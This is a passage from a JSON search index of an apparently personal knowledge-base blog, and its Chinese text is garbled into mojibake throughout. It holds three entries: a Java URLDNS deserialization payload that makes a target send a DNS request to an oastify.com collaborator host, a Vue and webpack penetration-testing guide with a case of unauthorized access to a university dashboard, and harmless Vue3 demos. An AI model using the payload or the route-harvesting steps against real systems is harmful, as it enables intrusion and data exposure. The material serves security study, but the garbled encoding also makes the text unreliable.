//ä¸ºäº†ååºåˆ—åŒ–æ—¶è§¦å‘urlè¯·æ±‚ï¼Œä¿®æ”¹hashcodeä¸º-1 hashcodefield.set(url,-1); serialize(hashmap); } } éå¸¸ç®€å•çš„ä¸€æ¡é“¾å­ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„\n",
        "summary": "URLDNSé“¾ æ¦‚è¿° URLDNSé“¾ï¼Œåœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´\nå…¶ä¸­ HashMapç±»é‡å†™äº†readobject æ–¹æ³•ï¼Œreadobject æ–¹æ³•ä¼šè¯»å–ä¸€ä¸ªåºåˆ—åŒ–æ–‡ä»¶æµï¼š\nåœ¨ readObject æ–¹æ³•ä¸­çš„ putVal æ–¹æ³•ä¼šè°ƒç”¨ hash æ–¹æ³•\nhash æ–¹æ³•ä¸‹ä¼šè°ƒç”¨URLç±»çš„ hashCode æ–¹æ³•ï¼Œå½“ hashCode å±æ€§ä¸ç­‰äº-1ï¼Œä¼šè°ƒç”¨ handler.hashCode æ–¹æ³•\nç»§ç»­è·Ÿè¿›ä¼šè°ƒç”¨getHostAddress æ–¹æ³•\næœ€åè°ƒç”¨InetAddress.getByName æ–¹æ³•è§¦å‘DNSè¯·æ±‚\npayloadï¼š\npackage com.yuy0ung.fundamentals; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class SerializationTest { public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { Person person = new Person(\u0026#34;aa\u0026#34;, 22); HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); //ä¸ºäº†ä¸è§¦å‘urlè¯·æ±‚ï¼Œä¿®æ”¹hashcodeä¸æ˜¯-1 URL url = new URL(\u0026#34;http://187ukw81mwpvmptw82esrl8yvp1hpadz.oastify.com\u0026#34;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashcodefield.setAccessible(true); hashcodefield.set(url,1234); hashmap.put(url, 1); //ä¸ºäº†ååºåˆ—åŒ–æ—¶è§¦å‘urlè¯·æ±‚ï¼Œä¿®æ”¹hashcodeä¸º-1 hashcodefield.set(url,-1); serialize(hashmap); } } éå¸¸ç®€å•çš„ä¸€æ¡é“¾å­ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„\n"
    }
,
    {
        "title": "VUE\u0026webpackæ¡†æ¶æµ‹è¯•æŠ€å·§",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/vuewebpack%E6%A1%86%E6%9E%B6%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/",
        "content": "æµ…è°ˆVUE+webpackæ¡†æ¶æµ‹è¯•æŠ€å·§ ä¸»è¦è®°å½•é’ˆå¯¹vueå’Œwebpackçš„æµ‹è¯•æŠ€å·§\nåŸºç¡€çŸ¥è¯† Vue.js æ˜¯ä¸€ä¸ªæ¸è¿›å¼ JavaScript æ¡†æ¶ï¼Œç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢ï¼Œå­¦è¿‡ä¸€ç‚¹ç‚¹å‰ç«¯ä¾¿å¾ˆå¥½ç†è§£ï¼š\nåŸç”ŸJSï¼šè¦æ‰‹åŠ¨æŠ“å–DOMå…ƒç´ ï¼Œç”¨addEventListenerç›‘å¬ç‚¹å‡»ï¼Œè‡ªå·±è®¡ç®—æ€»ä»·å¹¶æ›´æ–°é¡µé¢ Vueï¼šä½ åªè¦å†™å¥½æ•°æ® cartItems å’Œ totalPriceï¼Œç•Œé¢ä¼šè‡ªåŠ¨è·Ÿç€å˜åŒ– è€Œ Webpack æ˜¯ä¸€ä¸ªæ¨¡å—æ‰“åŒ…å·¥å…·ï¼Œç”¨äºå°†é¡¹ç›®ä¸­çš„å„ç§èµ„æºï¼ˆå¦‚ JavaScript æ¨¡å—ã€CSS æ ·å¼æ–‡ä»¶ã€å›¾ç‰‡ç­‰ï¼‰æ‰“åŒ…æˆæµè§ˆå™¨å¯ä»¥è¯†åˆ«çš„æ–‡ä»¶ï¼ŒåŒæ ·å¾ˆå¥½ç†è§£ï¼š\nå‡è®¾ä¸€ä¸ªå¤§å‹é¡¹ç›®ï¼Œå‰ç«¯çš„æ–‡ä»¶ï¼š\n100 ä»½JSæ–‡ä»¶ 50 ä»½CSSæ–‡ä»¶ 200 ç§å›¾ç‰‡å­—ä½“ç­‰ æ­£å¸¸åŠ è½½çš„è¯å¯èƒ½éœ€è¦æµè§ˆå™¨å‘å‡ ç™¾ä¸ªè¯·æ±‚ï¼Œè€ŒWebpackå¯ä»¥å¾ˆå¥½çš„æ•´åˆæ‰“åŒ…ï¼Œä¸€æ¬¡æ€§åŠ è½½ï¼Œæ˜¾è‘—é™ä½è¯·æ±‚çš„å‹åŠ›ï¼Œæ¯”å¦‚è¯´ï¼š\nä½ å†™äº†ä¸€ä¸ª .vue æ–‡ä»¶ï¼ˆåŒ…å«HTML/JS/CSSï¼‰ â†“ Webpack ç”¨ vue-loader æ‹†è§£æˆä¸‰éƒ¨åˆ† â†“ JSéƒ¨åˆ†äº¤ç»™Babelè½¬è¯‘ CSSéƒ¨åˆ†äº¤ç»™PostCSSåŠ å‰ç¼€ â†“ æœ€ååˆå¹¶æˆ 1ä¸ªapp.js å’Œ 1ä¸ªstyle.css â†“ æµè§ˆå™¨åªéœ€åŠ è½½2ä¸ªæ–‡ä»¶å°±èƒ½è¿è¡Œæ•´ä¸ªåº”ç”¨\næ¡†æ¶æµ‹è¯• æ¥ä¸‹æ¥åˆ†æé’ˆå¯¹vue+webpackè¿™ç±»ç½‘ç«™çš„æµ‹è¯•æŠ€å·§\nç‰¹å¾è¯†åˆ« æœ€ç®€å•å°±æ˜¯çœ‹urlä¸­æ˜¯å¦æœ‰/#/ï¼Œå¦‚æœæœ‰ï¼Œå¾ˆå¯èƒ½å°±æ˜¯vueç«™ç‚¹\né¦–å…ˆå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æµè§ˆå™¨æ’ä»¶Wappalyzerï¼Œå¯ä»¥å¿«é€Ÿè¯†åˆ«ç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†webpackæˆ–vueæŠ€æœ¯ï¼š\nå…¶æ¬¡å­¦ä¹ è¿‡vueå¼€å‘çš„å°±çŸ¥é“è¿˜æœ‰ä¸€æ¬¾ç”¨äºvueæµ‹è¯•çš„æ’ä»¶Vue.js devtoolsï¼ŒåŒæ ·å¯ä»¥è¯†åˆ«ç½‘ç«™å‰ç«¯æ˜¯å¦ä¸ºvueï¼š\næ­£å¸¸æƒ…å†µä¸‹æ’ä»¶ä¸ºç°è‰²ï¼š\nè‹¥ç½‘ç«™ä½¿ç”¨äº†vueï¼Œæ’ä»¶å›¾æ ‡åˆ™ä¼šäº®èµ·ï¼š\næˆ‘ä»¬ä¹Ÿå¯ä»¥F12æŸ¥çœ‹ç½‘é¡µåŠ è½½çš„jsæ–‡ä»¶æ¥åˆ¤æ–­ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæˆ–å°‘é‡app.xxx.jså’Œä¸€å¤§å †chunk-xxx.jsæ–‡ä»¶ï¼š\nAPIæ¥å£å’Œè·¯ç”±è·å– å¸¸è§„æ’ä»¶ é¦–å…ˆè‚¯å®šéå¸¸æ–¹ä¾¿çš„æ’ä»¶findsomethingï¼Œèƒ½å°†åŠ è½½å‡ºçš„jsä¸­çš„è·¯ç”±è¯†åˆ«å¹¶åˆ—å‡ºï¼š ä¹Ÿæœ‰ç±»ä¼¼çš„å…¶ä»–å·¥å…·ï¼Œæ¯”å¦‚burpçš„HAEã€BurpJSLinkFinderç­‰æ’ä»¶\nJSæ–‡ä»¶ é¦–å…ˆæŸ¥çœ‹çš„å°±æ˜¯app.xxx.jsï¼Œé€šè¿‡æœç´¢å…³é”®å­—ï¼ˆæ¯”å¦‚path:\u0026quot;ï¼‰å¯èƒ½ä¼šæ‰¾åˆ°ä¸€äº›è·¯ç”±ï¼š\nä¸Šé¢æåˆ°äº†chunkç»“æ„çš„æ‰“åŒ…æ–‡ä»¶ï¼Œåœ¨ä½æƒé™çŠ¶æ€ä¸‹ï¼Œæœ‰äº›jsä¸ä¼šè‡ªåŠ¨åŠ è½½ï¼Œå¾€å¾€è¿™ç±»jså¯èƒ½ä¼šå­˜åœ¨å¤§é‡æ¥å£å’Œæ•æ„Ÿä¿¡æ¯ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥è¿›å…¥app.jsè¿™ç±»æ–‡ä»¶æŸ¥çœ‹æ‰€æœ‰çš„chunk-xxx.jsï¼š\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬å¤„ç†è¿™äº›chunkä¸ºå¯¹åº”urlï¼Œå†è¿›è¡Œæ‰¹é‡è®¿é—®ï¼Œé…åˆburpæ’ä»¶ç­‰å¯»æ‰¾éšè—æ¥å£**ï¼ˆæ¯”å¦‚httpxä»£ç†åˆ°burpï¼Œé…åˆjslinkfinderå’ŒHaeè¿›è¡Œå¤„ç†ï¼‰**ï¼Œå¯ä»¥æ‰©å¤§æ”»å‡»é¢ï¼š\nå½“ç„¶ï¼Œæœ‰çš„ç½‘ç«™ä¼šå°†webpackçš„åŒ…ç»™å‡ºæ¥ï¼ˆä¹Ÿå¯èƒ½æ˜¯webpackæºç æ³„éœ²ï¼Œæ¶‰åŠsource-mapç›¸å…³æ¦‚å¿µï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•åœ¨å…¶ä¸­çš„/api/ã€/router/è¿™ç±»ç›®å½•ä¸­å¯»æ‰¾ç½‘ç«™è·¯ç”±ä»£ç ï¼š\nå·¥å…· è¿™ä¸ªæ—¶å€™æœ‰äººé—®äº†ï¼Œå¸ˆå‚…å¸ˆå‚…ï¼Œä½ è¿™äº›æŠ€å·§è¿˜æ˜¯å¤ªåƒæ“ä½œäº†ï¼Œæœ‰æ²¡æœ‰æ›´ç®€å•å¼ºåŠ¿çš„æ–¹æ³•æ¨èä¸€ä¸‹ï¼Ÿæœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„\næ‡’äººä¸“å±æ‰«æå·¥å…·å¥½å§ï¼š\nGitHub - zangcc/Aakian-FaCai: åŸºäºå‰ç«¯vueæ¡†æ¶çš„JavaFxå›¾å½¢åŒ–GUIæ¼æ´æ‰«æå·¥å…·\nå½“ç„¶ï¼Œå¸‚é¢ä¸Šè¿˜æœ‰å¾ˆå¤šç±»ä¼¼å·¥å…·ï¼Œå¯ä»¥è‡ªè¡Œé€‰æ‹©\næ¥å£æµ‹è¯• å¸¸è§çš„å°±æ˜¯æœªæˆæƒè¿™ç±»é€»è¾‘æ¼æ´çš„æµ‹è¯•äº†\næ¯”å¦‚è¿™ä¸ªæŸå¤§å­¦çš„æ¡ˆä¾‹ï¼ˆåšç ï¼‰ï¼š\næ­£å¸¸è®¿é—®webç›®å½•æ˜¯ä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢çš„ï¼š\næœé›†åˆ†æä¸€ä¸‹è·¯ç”±ï¼Œç»å…¸ä¸€æœä¸€å¤§å †ï¼š\næŒ¨ç€æŒ¨ç€å°è¯•è®¿é—®éƒ½æœ‰é‰´æƒï¼Œç›´åˆ°è¿™ä¸ª/homeè·¯ç”±ï¼š\nè®¿é—®å‘ç°ç›´æ¥è¿›å»äº†æ²¡æœ‰ç™»å½•ï¼š\nå¯ä»¥çœ‹è§æ˜¯ä¸€ä¸ªå¤§å±ï¼Œæ³„æ¼äº†éƒ¨é—¨ã€é‡‘é¢ç­‰ä¿¡æ¯ï¼Œä¸ç»†è¯´äº†\n",
        "summary": "æµ…è°ˆVUE+webpackæ¡†æ¶æµ‹è¯•æŠ€å·§ ä¸»è¦è®°å½•é’ˆå¯¹vueå’Œwebpackçš„æµ‹è¯•æŠ€å·§\nåŸºç¡€çŸ¥è¯† Vue.js æ˜¯ä¸€ä¸ªæ¸è¿›å¼ JavaScript æ¡†æ¶ï¼Œç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢ï¼Œå­¦è¿‡ä¸€ç‚¹ç‚¹å‰ç«¯ä¾¿å¾ˆå¥½ç†è§£ï¼š\nåŸç”ŸJSï¼šè¦æ‰‹åŠ¨æŠ“å–DOMå…ƒç´ ï¼Œç”¨addEventListenerç›‘å¬ç‚¹å‡»ï¼Œè‡ªå·±è®¡ç®—æ€»ä»·å¹¶æ›´æ–°é¡µé¢ Vueï¼šä½ åªè¦å†™å¥½æ•°æ® cartItems å’Œ totalPriceï¼Œç•Œé¢ä¼šè‡ªåŠ¨è·Ÿç€å˜åŒ– è€Œ Webpack æ˜¯ä¸€ä¸ªæ¨¡å—æ‰“åŒ…å·¥å…·ï¼Œç”¨äºå°†é¡¹ç›®ä¸­çš„å„ç§èµ„æºï¼ˆå¦‚ JavaScript æ¨¡å—ã€CSS æ ·å¼æ–‡ä»¶ã€å›¾ç‰‡ç­‰ï¼‰æ‰“åŒ…æˆæµè§ˆå™¨å¯ä»¥è¯†åˆ«çš„æ–‡ä»¶ï¼ŒåŒæ ·å¾ˆå¥½ç†è§£ï¼š\nå‡è®¾ä¸€ä¸ªå¤§å‹é¡¹ç›®ï¼Œå‰ç«¯çš„æ–‡ä»¶ï¼š\n100 ä»½JSæ–‡ä»¶ 50 ä»½CSSæ–‡ä»¶ 200 ç§å›¾ç‰‡å­—ä½“ç­‰ æ­£å¸¸åŠ è½½çš„è¯å¯èƒ½éœ€è¦æµè§ˆå™¨å‘å‡ ç™¾ä¸ªè¯·æ±‚ï¼Œè€ŒWebpackå¯ä»¥å¾ˆå¥½çš„æ•´åˆæ‰“åŒ…ï¼Œä¸€æ¬¡æ€§åŠ è½½ï¼Œæ˜¾è‘—é™ä½è¯·æ±‚çš„å‹åŠ›ï¼Œæ¯”å¦‚è¯´ï¼š\nä½ å†™äº†ä¸€ä¸ª .vue æ–‡ä»¶ï¼ˆåŒ…å«HTML/JS/CSSï¼‰ â†“ Webpack ç”¨ vue-loader æ‹†è§£æˆä¸‰éƒ¨åˆ† â†“ JSéƒ¨åˆ†äº¤ç»™Babelè½¬è¯‘ CSSéƒ¨åˆ†äº¤ç»™PostCSSåŠ å‰ç¼€ â†“ æœ€ååˆå¹¶æˆ 1ä¸ªapp.js å’Œ 1ä¸ªstyle.css â†“ æµè§ˆå™¨åªéœ€åŠ è½½2ä¸ªæ–‡ä»¶å°±èƒ½è¿è¡Œæ•´ä¸ªåº”ç”¨\næ¡†æ¶æµ‹è¯• æ¥ä¸‹æ¥åˆ†æé’ˆå¯¹vue+webpackè¿™ç±»ç½‘ç«™çš„æµ‹è¯•æŠ€å·§\nç‰¹å¾è¯†åˆ« æœ€ç®€å•å°±æ˜¯çœ‹urlä¸­æ˜¯å¦æœ‰/#/ï¼Œå¦‚æœæœ‰ï¼Œå¾ˆå¯èƒ½å°±æ˜¯vueç«™ç‚¹\né¦–å…ˆå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æµè§ˆå™¨æ’ä»¶Wappalyzerï¼Œå¯ä»¥å¿«é€Ÿè¯†åˆ«ç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†webpackæˆ–vueæŠ€æœ¯ï¼š\nå…¶æ¬¡å­¦ä¹ è¿‡vueå¼€å‘çš„å°±çŸ¥é“è¿˜æœ‰ä¸€æ¬¾ç”¨äºvueæµ‹è¯•çš„æ’ä»¶Vue.js devtoolsï¼ŒåŒæ ·å¯ä»¥è¯†åˆ«ç½‘ç«™å‰ç«¯æ˜¯å¦ä¸ºvueï¼š\næ­£å¸¸æƒ…å†µä¸‹æ’ä»¶ä¸ºç°è‰²ï¼š\nè‹¥ç½‘ç«™ä½¿ç”¨äº†vueï¼Œæ’ä»¶å›¾æ ‡åˆ™ä¼šäº®èµ·ï¼š\næˆ‘ä»¬ä¹Ÿå¯ä»¥F12æŸ¥çœ‹ç½‘é¡µåŠ è½½çš„jsæ–‡ä»¶æ¥åˆ¤æ–­ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæˆ–å°‘é‡app.xxx.jså’Œä¸€å¤§å †chunk-xxx.jsæ–‡ä»¶ï¼š\nAPIæ¥å£å’Œè·¯ç”±è·å– å¸¸è§„æ’ä»¶ é¦–å…ˆè‚¯å®šéå¸¸æ–¹ä¾¿çš„æ’ä»¶findsomethingï¼Œèƒ½å°†åŠ è½½å‡ºçš„jsä¸­çš„è·¯ç”±è¯†åˆ«å¹¶åˆ—å‡ºï¼š ä¹Ÿæœ‰ç±»ä¼¼çš„å…¶ä»–å·¥å…·ï¼Œæ¯”å¦‚burpçš„HAEã€BurpJSLinkFinderç­‰æ’ä»¶\nJSæ–‡ä»¶ é¦–å…ˆæŸ¥çœ‹çš„å°±æ˜¯app.xxx.jsï¼Œé€šè¿‡æœç´¢å…³é”®å­—ï¼ˆæ¯”å¦‚path:\u0026quot;ï¼‰å¯èƒ½ä¼šæ‰¾åˆ°ä¸€äº›è·¯ç”±ï¼š\nä¸Šé¢æåˆ°äº†chunkç»“æ„çš„æ‰“åŒ…æ–‡ä»¶ï¼Œåœ¨ä½æƒé™çŠ¶æ€ä¸‹ï¼Œæœ‰äº›jsä¸ä¼šè‡ªåŠ¨åŠ è½½ï¼Œå¾€å¾€è¿™ç±»jså¯èƒ½ä¼šå­˜åœ¨å¤§é‡æ¥å£å’Œæ•æ„Ÿä¿¡æ¯ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥è¿›å…¥app.jsè¿™ç±»æ–‡ä»¶æŸ¥çœ‹æ‰€æœ‰çš„chunk-xxx.jsï¼š\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬å¤„ç†è¿™äº›chunkä¸ºå¯¹åº”urlï¼Œå†è¿›è¡Œæ‰¹é‡è®¿é—®ï¼Œé…åˆburpæ’ä»¶ç­‰å¯»æ‰¾éšè—æ¥å£**ï¼ˆæ¯”å¦‚httpxä»£ç†åˆ°burpï¼Œé…åˆjslinkfinderå’ŒHaeè¿›è¡Œå¤„ç†ï¼‰**ï¼Œå¯ä»¥æ‰©å¤§æ”»å‡»é¢ï¼š\n"
    }
,
    {
        "title": "VUE3-å…¥é—¨demo",
        "link": "/My-Knowlege-Database/blog/%E5%89%8D%E7%AB%AF/vue3-%E5%85%A5%E9%97%A8demo/",
        "content": "VUE3-å…¥é—¨demo è®°å½•vueå­¦ä¹ æ—¶çš„ä¸€äº›åŸºç¡€demoï¼Œæˆ‘çš„å­¦ä¹ è·¯çº¿è§„åˆ’æ˜¯å…ˆç®€å•ä¸Šæ‰‹äº†è§£vueå†æ·±å…¥æ‰“åŸºç¡€\né£æ ¼ç»Ÿä¸€é‡‡ç”¨çš„æ˜¯ï¼šç»„åˆå¼API+å•æ–‡ä»¶ç»„ä»¶\nå­¦ä¹ èµ„æºä¸ºvueå®˜æ–¹æ–‡æ¡£\nref/reactiveåˆ›å»ºå“åº”å¼çŠ¶æ€ reactive() åªé€‚ç”¨äºå¯¹è±¡ (åŒ…æ‹¬æ•°ç»„å’Œå†…ç½®ç±»å‹ï¼Œå¦‚ Map å’Œ Set)ã€‚è€Œå¦ä¸€ä¸ª API ref() åˆ™å¯ä»¥æ¥å—ä»»ä½•å€¼ç±»å‹ã€‚ref ä¼šè¿”å›ä¸€ä¸ªåŒ…è£¹å¯¹è±¡ï¼Œå¹¶åœ¨ .value å±æ€§ä¸‹æš´éœ²å†…éƒ¨å€¼\nåœ¨ç»„åˆå¼ API ä¸­ï¼Œæ¨èä½¿ç”¨ ref() å‡½æ•°æ¥å£°æ˜å“åº”å¼çŠ¶æ€\nref() æ¥æ”¶å‚æ•°ï¼Œå¹¶å°†å…¶åŒ…è£¹åœ¨ä¸€ä¸ªå¸¦æœ‰ .value å±æ€§çš„ ref å¯¹è±¡ä¸­è¿”å›\nåˆ›å»ºå“åº”å¼çŠ¶æ€ï¼š\n\u0026lt;script setup\u0026gt; import { ref,reactive } from \u0026#39;vue\u0026#39; // ç»„ä»¶é€»è¾‘ // æ­¤å¤„å£°æ˜ä¸€äº›å“åº”å¼çŠ¶æ€ const message = ref(\u0026#39;Hello Yuy0ung\u0026#39;) const counter = reactive({ count:0 }) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;h1\u0026gt;{{message}}\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Count is: {{ counter.count }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; Attribute ç»‘å®š mustache è¯­æ³• (å³åŒå¤§æ‹¬å·) åªèƒ½ç”¨äºæ–‡æœ¬æ’å€¼ã€‚ä¸ºäº†ç»™ attribute ç»‘å®šä¸€ä¸ªåŠ¨æ€å€¼ï¼Œéœ€è¦ä½¿ç”¨ v-bind æŒ‡ä»¤ï¼Œç®€å†™ä¸º:\næ¯”å¦‚è¿™é‡Œç»™æ ‡é¢˜ç»‘å®šçº¢è‰²å±æ€§ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const titleClass = ref(\u0026#39;title\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;h1 :class=\u0026#34;titleClass\u0026#34;\u0026gt;Make me red\u0026lt;/h1\u0026gt; \u0026lt;!-- æ­¤å¤„æ·»åŠ ä¸€ä¸ªåŠ¨æ€ class ç»‘å®š --\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; .title { color: red; } \u0026lt;/style\u0026gt; äº‹ä»¶ç›‘å¬ ä½¿ç”¨ v-on æŒ‡ä»¤ç›‘å¬ DOM äº‹ä»¶ï¼Œç®€å†™ä¸º@\nå®ç°ç‚¹å‡»å¢åŠ æŒ‰é’®çš„countï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const count = ref(0) function pluscount() { //è‡ªå¢,æ›´æ–°ç»„ä»¶çŠ¶æ€ count.value++ } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;!-- ä½¿æ­¤æŒ‰é’®ç”Ÿæ•ˆ --\u0026gt; \u0026lt;button @click=\u0026#34;pluscount\u0026#34;\u0026gt;Count is: {{ count }}\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; è¡¨å•ç»‘å®š å¯ä»¥åŒæ—¶ä½¿ç”¨ v-bind å’Œ v-on æ¥åœ¨è¡¨å•çš„è¾“å…¥å…ƒç´ ä¸Šåˆ›å»ºåŒå‘ç»‘å®šï¼Œä½†ä¸ºäº†ç®€åŒ–åŒå‘ç»‘å®šï¼ŒVue æä¾›äº†ä¸€ä¸ª v-model æŒ‡ä»¤\nä½¿ç”¨å¦‚ä¸‹ï¼Œå¦‚æ­¤å®ç°ä¸€ä¸ªè¾“å…¥æ¡†ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const text = ref(\u0026#39;\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;input v-model=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type here\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ text }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ¡ä»¶æ¸²æŸ“ ä½¿ç”¨ v-if æŒ‡ä»¤æ¥æœ‰æ¡ä»¶åœ°æ¸²æŸ“å…ƒç´ ï¼š\næ¯”å¦‚è¿™é‡Œé€šè¿‡ç‚¹å‡»æŒ‰é’®æ¥åˆ‡æ¢æ˜¾ç¤ºæ–‡æœ¬\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const awesome = ref(true) function toggle() { awesome.value = !awesome.value } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button @click=\u0026#34;toggle\u0026#34;\u0026gt;Toggle\u0026lt;/button\u0026gt; \u0026lt;h1 v-if=\u0026#34;awesome\u0026#34;\u0026gt;Vue is awesome!\u0026lt;/h1\u0026gt; \u0026lt;h1 v-else\u0026gt;Oh no ğŸ˜¢\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; åˆ—è¡¨æ¸²æŸ“ å¯ä»¥ä½¿ç”¨ v-for æŒ‡ä»¤æ¥æ¸²æŸ“ä¸€ä¸ªåŸºäºæºæ•°ç»„çš„åˆ—è¡¨:\n\u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt; {{ todo.text }} \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; è¿™é‡Œçš„ todo æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œè¡¨ç¤ºå½“å‰æ­£åœ¨è¿­ä»£çš„æ•°ç»„å…ƒç´ ã€‚å®ƒåªèƒ½åœ¨ v-for æ‰€ç»‘å®šçš„å…ƒç´ ä¸Šæˆ–æ˜¯å…¶å†…éƒ¨è®¿é—®ï¼Œå°±åƒå‡½æ•°çš„ä½œç”¨åŸŸä¸€æ ·\næ¯ä¸ª todo å¯¹è±¡è®¾ç½®äº†å”¯ä¸€çš„ idï¼Œå¹¶ä¸”å°†å®ƒä½œä¸ºç‰¹æ®Šçš„ key attribute ç»‘å®šåˆ°æ¯ä¸ª \u0026lt;li\u0026gt;\næ›´æ–°åˆ—è¡¨æœ‰ä¸¤ç§æ–¹å¼ï¼š\nåœ¨æºæ•°ç»„ä¸Šè°ƒç”¨å˜æ›´æ–¹æ³•ï¼š todos.value.push(newTodo) ä½¿ç”¨æ–°çš„æ•°ç»„æ›¿ä»£åŸæ•°ç»„ï¼š\ntodos.value = todos.value.filter(/* ... */) åˆ©ç”¨è¿™ä¸ªå¯ä»¥å†™å‡ºä¸€ä¸ªtodolistå·¥å…·ï¼š\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; // ç»™æ¯ä¸ª todo å¯¹è±¡ä¸€ä¸ªå”¯ä¸€çš„ id let id = 0 const newTodo = ref(\u0026#39;\u0026#39;) const todos = ref([ { id: id++, text: \u0026#39;Learn HTML\u0026#39; }, { id: id++, text: \u0026#39;Learn JavaScript\u0026#39; }, { id: id++, text: \u0026#39;Learn Vue\u0026#39; } ]) function addTodo() { todos.value.push({ id: id++, text: newTodo.value },) newTodo.value = \u0026#39;\u0026#39; } function removeTodo(todo) { todos.value = todos.value.filter((t)=\u0026gt;t!=todo) } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;form @submit.prevent=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;newTodo\u0026#34; required placeholder=\u0026#34;new todo\u0026#34;\u0026gt; \u0026lt;button\u0026gt;Add Todo\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt; {{ todo.text }} \u0026lt;button @click=\u0026#34;removeTodo(todo)\u0026#34;\u0026gt;X\u0026lt;/button\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/template\u0026gt; è®¡ç®—å±æ€§ ä½¿ç”¨apicomputed()ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªèƒ½æ ¹æ®å…¶ä»–æ•°æ®æ¥æ”¹å˜è‡ªèº«valueçš„ref\næ¯”å¦‚ä¸‹é¢çš„todolistçš„æ¯ä¸ªlistå¯ä»¥æ ¹æ®è‡ªèº«æ˜¯å¦å®Œæˆæ¥è¿›è¡Œåˆ†ç±»éšè—ï¼š\n\u0026lt;script setup\u0026gt; import { ref,computed } from \u0026#39;vue\u0026#39; let id = 0 const newTodo = ref(\u0026#39;\u0026#39;) const hideCompleted = ref(false) const todos = ref([ { id: id++, text: \u0026#39;Learn HTML\u0026#39;, done: true }, { id: id++, text: \u0026#39;Learn JavaScript\u0026#39;, done: true }, { id: id++, text: \u0026#39;Learn Vue\u0026#39;, done: false } ]) const filteredTodos = computed(() =\u0026gt; { // æ ¹æ® `todos.value` \u0026amp; `hideCompleted.value` // è¿”å›è¿‡æ»¤åçš„ todo é¡¹ç›® return hideCompleted.value? todos.value.filter((t)=\u0026gt; !t.done): todos.value }) function addTodo() { todos.value.push({ id: id++, text: newTodo.value, done: false }) newTodo.value = \u0026#39;\u0026#39; } function removeTodo(todo) { todos.value = todos.value.filter((t) =\u0026gt; t !== todo) } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;form @submit.prevent=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;newTodo\u0026#34; required placeholder=\u0026#34;new todo\u0026#34;\u0026gt; \u0026lt;button\u0026gt;Add Todo\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in filteredTodos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; v-model=\u0026#34;todo.done\u0026#34;\u0026gt; \u0026lt;span :class=\u0026#34;{ done: todo.done }\u0026#34;\u0026gt;{{ 